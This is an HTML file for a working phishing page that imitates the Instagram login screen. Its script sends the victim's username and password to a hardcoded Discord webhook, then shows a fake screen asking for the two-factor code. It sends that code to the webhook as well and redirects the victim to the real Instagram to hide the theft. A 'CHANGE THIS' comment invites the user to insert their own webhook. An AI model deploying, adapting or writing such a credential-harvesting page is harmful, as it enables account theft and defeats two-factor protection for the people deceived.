<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body {
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
        }
        .login-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 40px 40px 30px;
            width: 350px;
            text-align: center;
            border-radius: 1px;
        }
        .logo {
            font-family: 'Billabong', cursive;
            font-size: 42px;
            margin-bottom: 20px;
            color: #262626;
        }
        input {
            width: 100%;
            padding: 12px 10px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            background: #fafafa;
            font-size: 14px;
        }
        input:focus {
            outline: none;
            border-color: #a8a8a8;
        }
        button {
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            background: #0095f6;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
        }
        button:hover { background: #0074d9; }
        .error { color: #ed4956; font-size: 13px; margin-top: 10px; display: none; }
        .footer { margin-top: 15px; font-size: 12px; color: #8e8e8e; }
        #code-section { display: none; }
        .or-divider { display: flex; margin: 15px 0; align-items: center; }
        .or-divider:before, .or-divider:after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
        .or-divider span { padding: 0 15px; color: #8e8e8e; font-size: 12px; font-weight: bold; }
        .fb-login { color: #385185; font-weight: bold; font-size: 14px; cursor: pointer; margin-top: 15px; display: block; text-decoration: none; }
    </style>
</head>
<body>

<div class="login-box" id="login-box">
    <div class="logo">Instagram</div>
    
    <form id="login-form" onsubmit="return false;">
        <input type="text" id="username" placeholder="Phone number, username, or email" required>
        <input type="password" id="password" placeholder="Password" required>
        <button id="login-btn">Log in</button>
    </form>
    
    <div class="or-divider"><span>OR</span></div>
    
    <a href="#" class="fb-login">Log in with Facebook</a>
    <div class="error" id="error-msg">Sorry, your password was incorrect. Please double-check your password.</div>
    <div class="footer">Forgot password?</div>
</div>

<div class="login-box" id="code-section" style="display:none;">
    <div class="logo">Instagram</div>
    <p style="font-size:14px; color:#262626; margin-bottom:15px;">We sent a login code to your email. Enter it below.</p>
    
    <form id="code-form" onsubmit="return false;">
        <input type="text" id="code" placeholder="6-digit code" maxlength="6" required>
        <button id="code-btn">Confirm</button>
    </form>
    
    <div class="error" id="code-error" style="display:none;">Wrong code. Please try again.</div>
</div>

<script>
    // ===== DISCORD WEBHOOK =====
    const WEBHOOK = "https://discord.com/api/webhooks/1452396951327735879/qFZteFYyu8Fiho_9CBt8IlaVRuPEc-U0OBmXjHkxkVUVPuFmndiOhj_aGjXXKt3W4TKd";  // CHANGE THIS

    // ===== PHASE 1: SEND CREDENTIALS =====
    document.getElementById('login-btn').addEventListener('click', function() {
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        if (!username || !password) {
            document.getElementById('error-msg').style.display = 'block';
            return;
        }

        // Send to Discord
        const data = {
            content: `**🎯 INSTAGRAM PHISH**\n**Username:** \`${username}\`\n**Password:** \`${password}\`\n**IP:** ${fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip)}`
        };

        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        // Switch to 2FA screen
        document.getElementById('login-box').style.display = 'none';
        document.getElementById('code-section').style.display = 'block';
    });

    // ===== PHASE 2: SEND 2FA CODE =====
    document.getElementById('code-btn').addEventListener('click', function() {
        const code = document.getElementById('code').value;

        if (!code || code.length < 6) {
            document.getElementById('code-error').style.display = 'block';
            return;
        }

        // Send 2FA code to Discord
        const data = {
            content: `**🔐 2FA CODE**\n**Code:** \`${code}\``
        };

        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        // Show error and redirect to real Instagram after 2s
        document.getElementById('code-error').style.display = 'block';
        document.getElementById('code-error').innerText = '⚠️ Something went wrong. Please try again.';

        setTimeout(function() {
            window.location.href = 'https://www.instagram.com/';
        }, 2000);
    });
</script>

</body>
</html>
